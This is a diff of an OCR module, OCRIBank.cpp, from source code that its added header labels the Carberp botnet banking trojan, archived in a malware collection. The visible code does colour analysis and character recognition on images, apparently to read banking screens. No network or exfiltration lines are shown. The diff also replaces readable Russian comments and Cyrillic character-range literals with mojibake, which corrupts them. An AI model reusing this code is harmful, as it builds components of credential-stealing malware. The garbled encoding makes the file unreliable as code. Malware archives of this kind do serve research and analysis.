@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // OCRIBank.cpp : Defines the exported functions for the DLL application.
 //
 
@@ -5,32 +16,32 @@
 #include "..\misc\image.h"
 #include "..\misc\ocr.h"
 
-//определяет цвет основного текста
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static int GetColor1( uchar* img, int w, int h )
 {
 	int c = w * h;
-	int colors[256]; //количество цветов
+	int colors[256]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i < 256; i++ ) colors[i] = 0;
-	//подсчитываем количество каждого цвета
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i < c; i++ )
 		colors[img[i]]++;
-	int th = c / 100; //нужного цвета не менее 1%
-	//ищем самый первый цвет выше th
+	int th = c / 100; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 1%
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ th
 	for( int i = 0; i < 256; i++ )
 		if( colors[i] > th )
 			return i;
 	return -1;
 }
 
-//ищем цвет + который рисуется в дереве (tree)
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ + пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (tree)
 static int GetColor2( uchar* img, int w, int h )
 {
-	//ищем в левой части картинки символ +
+	//пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ +
 	for( int y = 0; y < h - 10; y++ )
 	{
 		uchar* p = img +  y * w;
-		int wx = w / 10; //сколько точек слева смотреть
-		//ищем знак +
+		int wx = w / 10; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ +
 		for( int x = 1; x < wx; x++, p++ )
 		{
 			if( p[0] != p[-1] && p[-1] == p[1] &&
@@ -45,7 +56,7 @@ static int GetColor2( uchar* img, int w, int h )
 	return -1;
 }
 
-//анализирует картинку и возвращает в массиве colors цвета текстовой информации
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ colors пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int GetColorText( uchar* img, int w, int h, int* colors )
 {
 	int ret = 0;
@@ -64,8 +75,8 @@ void ParseImage( const char* nameFile )
 	{ 
 		{ 'a', 'z' },
 		{ 'A', 'Z' },
-		{ 'а', 'я' },
-		{ 'А', 'Я' },
+		{ 'пїЅ', 'пїЅ' },
+		{ 'пїЅ', 'пїЅ' },
 		{ '0', '9' },
 		{ '+', '+' },
 		{ '-', '-' },
@@ -78,7 +89,7 @@ void ParseImage( const char* nameFile )
 	//	DbgMsg( "%d - %d", i, colors[i] );
 	int colors[2];
 	int c_color = GetColorText( img, width, height, colors );
-	//оставляем только нужные цвета
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	int sz = width * height;
 	for( int i = 0; i < sz; i++ )
 	{
@@ -124,7 +135,7 @@ void ParseImage( const char* nameFile )
 		chars[i] = OCRChar( font, bits );
 		//DbgMsg( "[%c] %d,%d %d,%d", s, rects[i].left, rects[i].top, rects[i].right, rects[i].bottom );
 	}
-	//объединяем символы в слова
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	Word* words = (Word*)u_alloc( sizeof(Word) * c_rects );
 	int c_words = UnionChars( rects, chars, c_rects, words );
 	for( int i = 0; i < c_words; i++ )
